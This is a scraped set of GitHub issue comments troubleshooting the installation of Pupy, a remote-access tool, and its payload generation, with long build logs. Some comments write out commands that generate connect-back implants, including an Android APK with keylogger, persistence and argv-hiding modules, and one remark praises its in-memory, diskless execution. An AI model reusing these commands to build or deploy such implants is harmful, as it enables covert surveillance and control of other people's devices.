-D_FORTIFY_SOURCE=2 -g -fdebug-prefix-map=/build/python2.7-2.7.13=. -fstack-protector-strong -Wformat -Werror=format-security -fPIC -I/usr/include/python2.7 -c pykcp.c -o build/temp.linux-x86_64-2.7/pykcp.o -g -O3 -Wall -std=gnu89\n    pykcp.c:10:22: fatal error: kcp/ikcp.h: No such file or directory\n     #include \"kcp/ikcp.h\"\n                          ^\n    compilation terminated.\n    error: command 'x86_64-linux-gnu-gcc' failed with exit status 1\n----------------------------------------\n\nCan't roll back KCP; was not uninstalled\nCommand \"/usr/bin/python -c \"import setuptools, tokenize;file='/home/user/pupy/pupy/external/pykcp/setup.py';f=getattr(tokenize, 'open', open)(file);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, file, 'exec'))\" develop --no-deps\" failed with error code 1 in /home/user/pupy/pupy/external/pykcp/\n)\nso i downloaded payload_templates and put it manually into /home/user/pupy/pupy/ and fired up \nsudo ./pupygen.py in order to generate a payload and walla! it works also sudo ./pupsh.py ut of course with errors but it is in a hypervisor...\n . O.k so here is the reason i switched to the other method to generate a shell i had the following error when generating the workspace...\ndaemonize.o: In function `daemonize':\n/build/workspace/project/client/sources-linux/daemonize.c:214: warning: fexecve is not implemented and will always fail\n[+] Build complete\n[+] Build sources-linux with toolchain alxchk/tc-linux64\nTraceback (most recent call last):\n  File \"./create-workspace.py\", line 169, in \n    main()\n  File \"./create-workspace.py\", line 79, in main\n    ], env=env, cwd=pupy)\n  File \"/usr/lib/python2.7/subprocess.py\", line 186, in check_call\n    raise CalledProcessError(retcode, cmd)\nsubprocess.CalledProcessError: Command '['./build-docker.sh']' returned non-zero exit status 139\n. i put more memory on the qubes machine and i successfully installed requirements.txt.. This is the error I got when executing the command  `cd pupy && ./create-workspace.py pupyws\n` which brings me back to the sudo ./pupysh.py configuration and to strazzom yes it does work ;) i am trying to get the app and server to work\n/build/workspace/project/client/sources-linux/daemonize.c:214: warning: fexecve is not implemented and will always fail\n[+] Build complete\n[+] Build sources-linux with toolchain alxchk/tc-linux64\nTraceback (most recent call last):\n  File \"./create-workspace.py\", line 169, in \n    main()\n  File \"./create-workspace.py\", line 79, in main\n    ], env=env, cwd=pupy)\n  File \"/usr/lib/python2.7/subprocess.py\", line 186, in check_call\n    raise CalledProcessError(retcode, cmd)\nsubprocess.CalledProcessError: Command '['./build-docker.sh']' returned non-zero exit status 139\n. well i mean its hard to seperate the issues ans see which one is causing the connectivity problems.. it could be an ABI issue or maybe its an issue with Qubes 4.0 lol im sorry i havent replied yet i had to get sleep :)\n. that is my question, in issue #645 I succesfully installed pupy and got this message at the end of the installation:\nCollecting pycryptodome\n  Using cached https://files.pythonhosted.org/packages/40/26/1546cda8b55c08001c9100c031bd1be4c93edb18bee788877f7e23fc1ecd/pycryptodome-3.6.6-cp27-cp27mu-manylinux1_x86_64.whl\nInstalling collected packages: pycryptodome\n  Found existing installation: pycryptodome 3.6.6\n    Uninstalling pycryptodome-3.6.6:\n      Successfully uninstalled pycryptodome-3.6.6\nSuccessfully installed pycryptodome-3.6.6\n[+] Create pupysh wrapper\n[+] Store symlink to pupysh to /root/.local/bin\n[-] /root/.local/bin is not in your PATH!\n```\nwhich is talking about my PATH and also in issue #645 I mentioned installing jdk10.0.2 as part of the install, I then posted a link/article referencing the walkthrough that I followed that has instructions and screenshots for how I modified my PATH(here it is:https://linuxhint.com/install-openjdk-10-debian-9-stretch/) \nbut after successfully installing as according to #645 I get the following when generating an android .apk:\n[!] Host and port will be ignored\n[+] loading scriptlet 'hide_argv' with args {'name': 'architect'}\n[+] loading scriptlet 'keylogger' with args {}\n[+] loading scriptlet 'daemonize' with args {}\n[+] loading scriptlet 'persistence' with args {'method': 'registry'}\n[+] Generate client: android/x64\n[C] launcher: connect\n[C] launcher_args: ['--host', 'IPCENSORED:443', '-t', 'ssl']\n[C] cid: 0x83c1a944L\n[C] debug: False\n[+] Required credentials (found):\n[+] SSL_BIND_CERT, SSL_CA_CERT, SSL_CLIENT_CERT, SSL_BIND_KEY, SSL_CLIENT_KEY\n[+] generating PY payload ...\n[+] packaging the apk ... (can take 10-20 seconds)\n/bin/sh: 1: jarsigner: not found\n[-] payload generation failed: Command 'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '/tmp/tmp_pupy__P9H6L' pupy_key' returned non-zero exit status 127\nhow do i change it to make sure it is in my PATH?\n. no. I am having trouble identifying a reliable way to install jarsigner/jdk 10.0.2 :( uggghhh i am testing the windows client right now after following the instructions from #645 . I successfully executed: https://github.com/n1nj4sec/pupy/wiki/Installation-(Debian-9) in Qubes 4.0 by: enlarging my memory size in qubes VM \ninstalling jdk 10.*.*(most updated version)\nand maybe also jarsigner as a package individually \nexecuting the command qvm-prefs -s <vm-name> kernelopts \"nopat vsyscall=emulate\" ine the Dom0 terminal in order to configure the VM properly and then going through the steps detailed above or below\nhttps://github.com/n1nj4sec/pupy/wiki/Installation-(Debian-9). thanks guys you are the best! this is a great addition of capability to pupy! now i have to test the generation of those .apk files.... First and foremost on a fully updated Qubes 4.0 Debian-9 TEMPLATE do the following:\n1.execute the command:\n qvm-prefs -s <vm-name> kernelopts \"nopat vsyscall=emulate\" in the Dom0 terminal in order to configure the VM (put name of VM in <vm-name)\n2.Change the ram in the VM settings and make sure that their is  plenty of ram AND ALSO disk space for system storage AND private storage, you will get errors at step#5 and also earlier if you don't.\n\nInstall the JDK 10..(most updated version) by following the directions below:\nThis is the link to the directions(it has screenshots):https://linuxhint.com/install-openjdk-10-debian-9-stretch/\nBelow is the directions that I followed for installing the JDK:\n\n```\nIn short, Java Development Kit (JDK) is used to compile Java source code into Java byte code. Then Java Runtime Environment (JRE) translates the Java byte code into machine language and runs Java programs. If you install JDK, you don\u2019t have to install JRE separately. But if you wish to only run Java programs, not to develop them, then you may install it separately.\nThere are 2 versions of JDK. Oracle JDK and OpenJDK. All the components of OpenJDK are open source. The same does not go with Oracle JDK. Some components of Oracle JDK are proprietary. This is why some people prefer OpenJDK over Oracle JDK.\nOpenJDK 10 recently just came out. So in this article I am going to show you how to install it in Debian 9 Stretch. Let\u2019s get started.\nDownloading OpenJDK 10\nIn this section, I will show you how to download OpenJDK 10 from the official website of OpenJDK.\nFirst go to the official website of OpenJDK 10 at http://jdk.java.net/10/ and you should see the following page as shown in the screenshot below.\nScroll down a little bit to the Downloads section. Click on the link as marked in the screenshot below to download the 64-bit Linux version of OpenJDK 10 tar.gz archive.\nClick on Save File and then click on OK.\nYour download should start as shown in the screenshot below.\nInstalling OpenJDK 10\nOnce your download is complete, you should find it in the default Downloads directory of your web browsers. In my case, it\u2019s the Downloads/ directory in my user\u2019s HOME directory.\nFirst, navigate to the Downloads/ directory with the following command:\n$ cd ~/Downloads\nNow if you list the directory contents with ls -lh command, you should find the OpenJDK 10 tar archive as shown in the marked section of the screenshot below.\nNow you have to extract the tar archive. I am going to extract it in my /opt directory. You may wish to choose another directory. You\u2019re free to do so.\n$ sudo tar xvzf openjdk-10_linux-x64_bin.tar.gz -C INSTALL_DIR\nThe tar archive should be extracted.\nNow if you list your INSTALL_DIR, in my case it\u2019s the /opt directory, you should see jdk-10/ directory as marked in the screenshot below.\nNow you have to add it to the PATH of your Debian 9 operating system. That way you don\u2019t have to type in the whole path to your OpenJDK 10 binary files in order to compile or run Java programs.\nRun the following command to create a new file jdk10.sh in /etc/profile.d directory:\n$ sudo nano /etc/profile.d/jdk10.sh\nYou should see the following window.\nNow add the following lines to the file:\nexport JAVA_HOME=\"NSTALL_DIR/jdk-10\"\nexport PATH=\"$PATH:${JAVA_HOME}/bin\"\nThe INSTALL_DIR in my case it /opt\nNow press  + x, then press y and then press  to save the file.\nOnce the file is saved, reboot your computer with the following command:\n$ sudo reboot\nOnce your computer starts, run the following command to test whether the JAVA_HOME environment variable is available:\n$ echo $JAVA_HOME\nAs you can see in the screenshot below, it\u2019s set to the correct path.\nYou can also check the PATH environment variable with the following command:\n$ echo $PATH\nAs you can see in the marked section of the screenshot below, the OpenJDK 10\u2019s bin/ directory is added to the PATH.\nNow run the following command to check whether OpenJDK is working or not:\n$ javac -version\nAs you can see in the screenshot below, OpenJDK 10 is working correctly.\nCompiling and Running a Java Program with OpenJDK 10\nIn this section, I will compile and run a simple Java program with OpenJDK 10 to show you that OpenJDK 10 is working correctly.\nThis is my simple hello world program saved in ~/Documents/codes/HelloWorld.java file.\npublic class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello World from LinuxHint!\");\n    }\n}\nCompiling HelloWorld.java with OpenJDK 10\nFirst navigate to the directory where the file is saved with the following command:\n$ cd ~/Documents/codes\nNow to compile HelloWorld.java Java source file, run the following command:\n$ javac HelloWorld.java\nRunning HelloWorld with OpenJDK 10\nOnce the HelloWorld.java file is compiled, a HelloWorld.class file is generated. This is the Java byte code file that you run with the java command as follows:\n$ java HelloWorld\nNOTE: If the Java byte code filename is HelloWorld.class, you run java HelloWorld. You must not include .class extension. Otherwise it won\u2019t work.\nAs you can see, the Java program ran successfully and displayed the correct output.\nSo that\u2019s how you install OpenJDK 10 on Debian 9 Stretch. Thank you for reading this article. \n```\n\nAfter this Follow the instructions provided by the pupy team here is the link(more readable):\n\nhttps://github.com/n1nj4sec/pupy/wiki/Installation-(Debian-9)#docker\nHere are the instructions:\n```\nThe original instructions that these are based on can be found here.\nThe following commands should be executed as the root user:\nsudo apt-get update && sudo apt-get install curl -y\nsudo curl -fsSL https://get.docker.com > docker_installer.sh\nsudo chmod +x ./docker_installer.sh && sudo ./docker_installer.sh\nBefore executing the file, please verify that the content has not been tampered with in transit, as there is no automatic integrity checking.\nFor the following command, the actual username should be substituted for .\nsudo usermod -aG docker \nPupysh system-wide dependencies\nThe following commands should be executed as the root user:\napt-get install git libssl1.0-dev libffi-dev python-dev python-pip tcpdump python-virtualenv\nPupy setup\nThe following commands should be executed as a non-root user:\nThe script pupy/create-workspace.py will create a Python virutalenv in the selected folder (pupyws in our example). The script also will create symlinks to pupysh at ~/.local/bin.\ngit clone --recursive https://github.com/alxchk/pupy\n```\n5.execute the command:\ncd pupy && sudo ./create-workspace.py pupyws\n(sudo is required due to the Qubes 4.0 environment;will get error if not enough ram and storage space in VM settings)\nDONE!\nI am noting the script in terminal:\nCollecting pycryptodome\n  Using cached https://files.pythonhosted.org/packages/40/26/1546cda8b55c08001c9100c031bd1be4c93edb18bee788877f7e23fc1ecd/pycryptodome-3.6.6-cp27-cp27mu-manylinux1_x86_64.whl\nInstalling collected packages: pycryptodome\n  Found existing installation: pycryptodome 3.6.6\n    Uninstalling pycryptodome-3.6.6:\n      Successfully uninstalled pycryptodome-3.6.6\nSuccessfully installed pycryptodome-3.6.6\n[+] Create pupysh wrapper\n[+] Store symlink to pupysh to /root/.local/bin\n[-] /root/.local/bin is not in your PATH!\nAfter this I am wondering If I should execute these commands(link):\nhttps://github.com/n1nj4sec/pupy/issues/639#issuecomment-414579386\n(text)\n```\nOkay, several things here.\nFirst - please don't use sudo and privileged account for to build pupy or start pupysh.\nSecond - please try to setup workspace properly\nThird - payload_templates repo/releases should not be used. You should always recompile templates after git pull.\nOnce you properly installed pupy, you can recompile template with\ndocker start -a build-pupy-TARGET\nYou can check prepared docker containers with\ndocker ps -a | grep build-pupy-\n```\nat this point I then run into a problem with jarsigner which is why i mentioned it and couldn't remember when generating a payload i think i fixed it once and that this has been mentioned in other places such as here : https://github.com/n1nj4sec/pupy/issues/621#issue-332718769 \nBelow is the message from terminal when executing a payload generation:\n```\n\n\ngen -O android -S -o Agent-Smith_1.1.apk -s hide_argv,name=architect -s keylogger -s daemonize -s persistence,method=registry --randomize-hash connect -t ssl --host Censored:443\n[+] loading scriptlet 'hide_argv' with args {'name': 'architect'}\n[+] loading scriptlet 'keylogger' with args {}\n[+] loading scriptlet 'daemonize' with args {}\n[+] loading scriptlet 'persistence' with args {'method': 'registry'}\n[+] Generate client: android/x86\n[C] launcher: connect\n[C] launcher_args: ['-t', 'ssl', '--host', '10.137.0.33:443']\n[C] cid: 0x62482150L\n[C] debug: False\n[+] Required credentials (found):\n[+] SSL_BIND_CERT, SSL_CA_CERT, SSL_CLIENT_CERT, SSL_BIND_KEY, SSL_CLIENT_KEY\n[+] generating PY payload ...\n[+] packaging the apk ... (can take 10-20 seconds)\n/bin/sh: 1: jarsigner: not found\n[-] payload generation failed: Command 'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '/tmp/tmp_pupy_7mOC_m' pupy_key' returned non-zero exit status 127\n\n\n\nhave you seen this issue before?. I have gotten to the point where i can run `sudo ./pupysh` in `/home/user/pupy/pupyws/bin` after that i type in: `dnscnc status `and it shows\n`[-] DNSCNC disabled`\ndo you have installation instructions?\n. is it just a module that on one has worked on yet? it seems you could just connect multiple sessions and it should work in the normal suo ./pupysh if you wanted to connect multiple clients... it seems i first have t activate it in: `config list ` is that true?  Are these related to the installation of this module: https://github.com/n1nj4sec/pupy/blob/master/pupy/network/lib/launchers/dnscnc.py, or  https://github.com/n1nj4sec/pupy/issues/426\n. yes, after installing open jdk with `sudo apt-get install default-jdk`Command I get the following message:\n` 'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '/tmp/tmp_pupy_E4cTkT' pupy_key' returned non-zero exit status 1`\nI have done this with docker, and also my own installation and with the installation of JDK followed in #645 and I am still getting this issue :(. its kinda buggy in different platforms... also not all features work i would check this websit, readme's also the \"issues\" section I have posted some walkthroughs also from the front page if you didnt see it:\nImportant notice:\nWe are currently working on cleaning up the project. Also we are in the middle of style cleanup, so there can be a lot of broken things.\nFor maximum compatibility, please use the docker image.\nTo pull the docker image, run: docker pull alxchk/pupy:unstable.\nIf you do not have docker installed, the simplest way to install docker on Linux is: run curl -fsSL https://get.docker.com > docker_installer.sh, and execute the script with bash ./docker_installer.sh as root. Before executing the file, please verify that the content has not been tampered with in transit, as there is no automatic integrity checking.\nIf you do not know how to use Docker, please refer to their documentation.\nPupy\nQuick docker install and configure\nLots of things are in various states of development but this will get a server up for you. I can confirm the linux clients work and the windows clients build.\nI've confirmed this easy method on debian sid, but it stands to reason it should work anywhere docker does. If you don't have an id_rsa.pub file, create one with ssh-keygen Just run it without arguments\ndocker pull alxchk/pupy:unstable\ndocker run -d -p 2022:22 -v /tmp/projects:/projects alxchk/pupy:unstable\ncp ~/.ssh/id_rsa.pub /tmp/projects/keys/authorized_keys\nssh -p 2022 pupy@127.0.0.1\nGrats your in a pupy shell, lets build a client and export it.\nconfig set gen os linux\ngen -D /projects/default/\nYou can find your pupy clients in /tmp/projects/default on the host. You can now use help to find commands, edit the config, generate clients, etc.. You'll want to use the -D /projects/default/ when generating clients, it makes it easy to pop back over on your host machine and pull them out of /tmp/projects/default since those volumes are bound together.\nIf you can't make a shared key or otherwise refuse to, you can try docker exec but be careful not to break your container.\ndocker exec -it  \nI'd recommend using a shell as a command if you go this route, else you lose your tab competion.\nEnjoy! Much appreciation to alxchk for all of his hard work.\n```. ",
    "HorneyAttorney": "So no one will try to help me figure out what's going on here?. thanks :D. and no worries about the visible IP.. it's dynamic and already changed.. so u_u. Don't type \"python\"\nit's just ./pupygen.py\nex: ./pupygen.py  connect --host 192.168.1.2:8080. Go to main Pupy folder and do this..\nwget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz\ntar xvf payload_templates.txz && mv payload_templates/* pupy/payload_templates/ && rm payload_templates.txz && rm -r payload_templates\nAnd dude, read the md files... I have the same issue. The listening port is already in use..\nTry a different port.. Pupy injects payload shell directly into the memory.\n\"Pupy doesn't touch the disk ;)\". I think it's like puppy.. everybody I know says it like this... ",
    "DarthShined": "Also I have tried to use \"git submodule update\" and \"sudo git submodule update\" but It does not work.. Thanks you very much!!\nNow It works perfeclty =D. ",
    "johnjohny1990": "I type ./pupygen.py but display this error\nWARNING:root:Your templates are not synced with your pupy version ! , you should update them with \"git submodule update\"\nWARNING:root:Your templates are not synced with your pupy version ! , you should update them with \"git submodule update\"\n[!] required argument missing, automatically adding parameter --host 192.168.1.1:443 from local or external ip address\n[+] Generate client: windows/x86\nERROR:root:Template not found (/opt/pupy/pupy/payload_templates/pupyx86.exe)\nTraceback (most recent call last):\n  File \"./pupygen.py\", line 643, in \n    pupygen(parser.parse_args(), config)\n  File \"./pupygen.py\", line 508, in pupygen\n    compressed=not ( args.uncompressed or args.packer )\n  File \"./pupygen.py\", line 313, in generate_binary_from_template\n    raise ValueError('Template not found ({})'.format(template))\nValueError: Template not found (/opt/pupy/pupy/payload_templates/pupyx86.exe)\nTemplate not found (/opt/pupy/pupy/payload_templates/pupyx86.exe)\n. i update them with \"git submodule update\" but it does not work. ",
    "th4ne": "the master version 1.6 does not have this bug...\nI use the master version only for that. ./pupygen.py connect --host IP/DNS:PORT     <-- estandar pupy32bit exe \ntry \"./pupygen.py -l\"   or  \"./pupygen.py -h\"\nfor more info https://github.com/n1nj4sec/pupy/wiki. Great very interesting! I'm trying it on (y). ",
    "kaush-rasto": "I am generating the payload form ubuntu running in VM . \nIs that a problem ? . ok I tried to generate exe using connect \nuser@ubuntu:~/Downloads/pupy/pupy$ ./pupygen.py connect --host myip:9456\nWARNING:root:Your templates are not synced with your pupy version ! , you should update them with \"git submodule update\"\nWARNING:root:Your templates are not synced with your pupy version ! , you should update them with \"git submodule update\"\n[+] Generate client: windows/x86\n[C] launcher: connect\n[C] launcher_args: ['--host', 'myip:9456']\n[C] debug: False\n[I] Credentials password: \n[+] Required credentials:\n[+] SSL_BIND_CERT, SSL_CA_CERT, SSL_CLIENT_CERT, SSL_BIND_KEY, SSL_CLIENT_KEY\n[+] OUTPUT_PATH = /home/user/Downloads/pupy/pupy/pupyx86.fqZmx5.exe\n[+] SCRIPTLETS = []\n[+] DEBUG = False\nExe created . \nI ran exe on windows 7 PC . \nAnd ./pupysh.py -port 9456 \non my Ubuntu VM .\nStill no clients active . \n. not really .. same thing when I disable AV . \nmoreover I dont see any pings going out from the exe client to pupy server ... ",
    "sl4v": "I have the same issue when running client binary from console. Running it from GUI (double click in explorer) works fine.. ",
    "Mr-BlackHat": "@n1nj4sec hey bro I\u2019m doing a project and i need help for that can u pls tell me how u created that windows payload u Mentioned Something that \u201cit is a pre-compiled and  converted using Pyinstaller\u201d.\nPls help help.\n\n. Which apk u want sign ? anyway u can use an android apk \u201czipsinger\u201d to sing an apk app. @glides \nYes i know but got some error after file was created used that exe to create payload but they are not throwing connection back... \nHave a look running buildenv.sh from client/sources\n\nRunning Wine/winetricks as root is highly discouraged. See https://wiki.winehq.org/FAQ#Should_I_run_Wine_as_root.3F\n\nYour version of wine 1.8.7 is no longer supported upstream. You should upgrade to 2.x\nUsing winetricks 20180217-next - sha256sum: 9d0d23c3b1c5277dc50ed5e6eb7a5dac85628370788763ce9a6da68c538e0225 with wine-1.8.7 (Debian 1.8.7-2) and WINEARCH=win32\nExecuting w_do_call winxp\nExecuting load_winxp \nSetting Windows version to winxp\nExecuting wine regedit C:\\windows\\Temp_winxp\\set-winver.reg\n\nRunning /usr/bin/wineserver -w. This will hang until all wine processes in prefix=/root/pupy/client/sources/buildenv/win32 terminate\n\nRunning Wine/winetricks as root is highly discouraged. See https://wiki.winehq.org/FAQ#Should_I_run_Wine_as_root.3F\n\nYou are using a 64-bit WINEPREFIX. Note that many verbs only install 32-bit versions of packages. If you encounter problems, please retest in a clean 32-bit WINEPREFIX before reporting a bug.\n\nYour version of wine 1.8.7 is no longer supported upstream. You should upgrade to 2.x\nUsing winetricks 20180217-next - sha256sum: 9d0d23c3b1c5277dc50ed5e6eb7a5dac85628370788763ce9a6da68c538e0225 with wine-1.8.7 (Debian 1.8.7-2) and WINEARCH=win64\nExecuting w_do_call win7\nExecuting load_win7 \nThe operation completed successfully\nSetting Windows version to win7\nExecuting wine regedit C:\\windows\\Temp_win7\\set-winver.reg\nExecuting wine64 regedit C:\\windows\\Temp_win7\\set-winver.reg\n\nRunning /usr/bin/wineserver -w. This will hang until all wine processes in prefix=/root/pupy/client/sources/buildenv/win64 terminate\nThe operation completed successfully\nThe operation completed successfully\nThe operation completed successfully\nCompiling C:\\Python27\\Lib\\lib2to3\\tests\\data\\py3_test_grammar.py ...\n  File \"C:\\Python27\\Lib\\lib2to3\\tests\\data\\py3_test_grammar.py\", line 130\n    x = ...\n        ^\nSyntaxError: invalid syntax\nCompiling C:\\Python27\\Lib\\test\\bad_coding.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding.py\", line 0\nSyntaxError: unknown encoding: uft-8\nCompiling C:\\Python27\\Lib\\test\\bad_coding2.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding2.py\", line 0\nSyntaxError: encoding problem: utf8 with BOM\nCompiling C:\\Python27\\Lib\\test\\bad_coding3.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding3.py\", line 0\nSyntaxError: decoder did not return an unicode object (type=str)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future3.py ...\nSyntaxError: future feature rested_snopes is not defined (badsyntax_future3.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future4.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future4.py\", line 3\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future5.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future5.py\", line 4\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future6.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future6.py\", line 3\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future7.py ...\nSyntaxError: from future imports must occur at the beginning of the file (badsyntax_future7.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future8.py ...\nSyntaxError: future feature * is not defined (badsyntax_future8.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future9.py ...\nSyntaxError: not a chance (badsyntax_future9.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_nocaret.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_nocaret.py\", line 2\n    [x for x in x] = x\nSyntaxError: can't assign to list comprehension\nCompiling C:\\Python27\\Lib\\lib2to3\\tests\\data\\py3_test_grammar.py ...\n  File \"C:\\Python27\\Lib\\lib2to3\\tests\\data\\py3_test_grammar.py\", line 130\n    x = ...\n        ^\nSyntaxError: invalid syntax\nCompiling C:\\Python27\\Lib\\test\\bad_coding.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding.py\", line 0\nSyntaxError: unknown encoding: uft-8\nCompiling C:\\Python27\\Lib\\test\\bad_coding2.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding2.py\", line 0\nSyntaxError: encoding problem: utf8 with BOM\nCompiling C:\\Python27\\Lib\\test\\bad_coding3.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding3.py\", line 0\nSyntaxError: decoder did not return an unicode object (type=str)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future3.py ...\nSyntaxError: future feature rested_snopes is not defined (badsyntax_future3.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future4.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future4.py\", line 3\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future5.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future5.py\", line 4\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future6.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future6.py\", line 3\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future7.py ...\nSyntaxError: from future imports must occur at the beginning of the file (badsyntax_future7.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future8.py ...\nSyntaxError: future feature * is not defined (badsyntax_future8.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future9.py ...\nSyntaxError: not a chance (badsyntax_future9.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_nocaret.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_nocaret.py\", line 2\n    [x for x in x] = x\nSyntaxError: can't assign to list comprehension\nCompiling C:\\Python27\\Lib\\lib2to3\\tests\\data\\py3_test_grammar.py ...\n  File \"C:\\Python27\\Lib\\lib2to3\\tests\\data\\py3_test_grammar.py\", line 130\n    x = ...\n        ^\nSyntaxError: invalid syntax\nCompiling C:\\Python27\\Lib\\test\\bad_coding.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding.py\", line 0\nSyntaxError: unknown encoding: uft-8\nCompiling C:\\Python27\\Lib\\test\\bad_coding2.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding2.py\", line 0\nSyntaxError: encoding problem: utf8 with BOM\nCompiling C:\\Python27\\Lib\\test\\bad_coding3.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding3.py\", line 0\nSyntaxError: decoder did not return an unicode object (type=str)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future3.py ...\nSyntaxError: future feature rested_snopes is not defined (badsyntax_future3.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future4.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future4.py\", line 3\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future5.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future5.py\", line 4\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future6.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future6.py\", line 3\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future7.py ...\nSyntaxError: from future imports must occur at the beginning of the file (badsyntax_future7.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future8.py ...\nSyntaxError: future feature * is not defined (badsyntax_future8.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future9.py ...\nSyntaxError: not a chance (badsyntax_future9.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_nocaret.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_nocaret.py\", line 2\n    [x for x in x] = x\nSyntaxError: can't assign to list comprehension\nCompiling C:\\Python27\\Lib\\lib2to3\\tests\\data\\py3_test_grammar.py ...\n  File \"C:\\Python27\\Lib\\lib2to3\\tests\\data\\py3_test_grammar.py\", line 130\n    x = ...\n        ^\nSyntaxError: invalid syntax\nCompiling C:\\Python27\\Lib\\test\\bad_coding.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding.py\", line 0\nSyntaxError: unknown encoding: uft-8\nCompiling C:\\Python27\\Lib\\test\\bad_coding2.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding2.py\", line 0\nSyntaxError: encoding problem: utf8 with BOM\nCompiling C:\\Python27\\Lib\\test\\bad_coding3.py ...\n  File \"C:\\Python27\\Lib\\test\\bad_coding3.py\", line 0\nSyntaxError: decoder did not return an unicode object (type=str)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future3.py ...\nSyntaxError: future feature rested_snopes is not defined (badsyntax_future3.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future4.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future4.py\", line 3\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future5.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future5.py\", line 4\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future6.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_future6.py\", line 3\n    from future import nested_scopes\nSyntaxError: from future imports must occur at the beginning of the file\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future7.py ...\nSyntaxError: from future imports must occur at the beginning of the file (badsyntax_future7.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future8.py ...\nSyntaxError: future feature * is not defined (badsyntax_future8.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_future9.py ...\nSyntaxError: not a chance (badsyntax_future9.py, line 3)\nCompiling C:\\Python27\\Lib\\test\\badsyntax_nocaret.py ...\n  File \"C:\\Python27\\Lib\\test\\badsyntax_nocaret.py\", line 2\n    [x for x in x] = x\nSyntaxError: can't assign to list comprehension\npupymemexec.c\nMicrosoft (R) Incremental Linker Version 9.00.30729.01\nCopyright (C) Microsoft Corporation.  All rights reserved.\n/NXCOMPAT:NO /LTCG \n/ltcg \n/dll \n/implib:C:\\Python27\\Lib\\site-packages\\pupymemexec.lib \n/out:C:\\Python27\\Lib\\site-packages\\pupymemexec.pyd \npupymemexec.obj \nC:\\Python27\\libs\\python27.lib \nadvapi32.lib \n   Creating library C:\\Python27\\Lib\\site-packages\\pupymemexec.lib and object C:\\Python27\\Lib\\site-packages\\pupymemexec.exp\nGenerating code\nFinished generating code\npupymemexec.c\nMicrosoft (R) Incremental Linker Version 9.00.30729.01\nCopyright (C) Microsoft 